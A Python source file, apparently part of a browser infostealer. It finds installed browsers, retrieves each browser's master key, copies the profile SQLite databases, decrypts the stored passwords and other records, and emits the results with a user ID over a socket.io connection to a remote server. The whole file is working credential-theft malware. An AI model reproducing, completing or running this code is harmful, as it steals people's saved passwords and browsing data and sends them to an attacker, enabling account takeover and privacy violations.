import os
import shutil
import sqlite3

from config import browsers, data_queries
from encryption_utils import get_master_key, decrypt_password


def get_data(path: str, profile: str, key, type_of_data):
    db_file = os.path.join(path, f'{profile}{type_of_data["file"]}')
    if not os.path.exists(db_file):
        return None
    temp_db_path = 'temp_db.sqlite'
    shutil.copy(db_file, temp_db_path)
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    rows = cursor.fetchall()
    conn.close()
    os.remove(temp_db_path)
    return format_data(rows, type_of_data, key)


def format_data(rows, type_of_data, key):
    result = ""
    for row in rows:
        if type_of_data['decrypt']:
            row = [decrypt_password(x, key) if isinstance(x, bytes) else x for x in row]
        formatted_row = "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)])
        result += formatted_row + "\n\n"
    return result


def send_browser_data(sio, user_id):
    available_browsers = [browser for browser, path in browsers.items() if os.path.exists(path)]
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if master_key:
            for data_type_name, data_type in data_queries.items():
                data = get_data(browser_path, "Default", master_key, data_type)
                if data:
                    sio.emit('browser_data_response',
                             {'browser': browser, 'type': data_type_name, 'data': data, 'user_id': user_id})
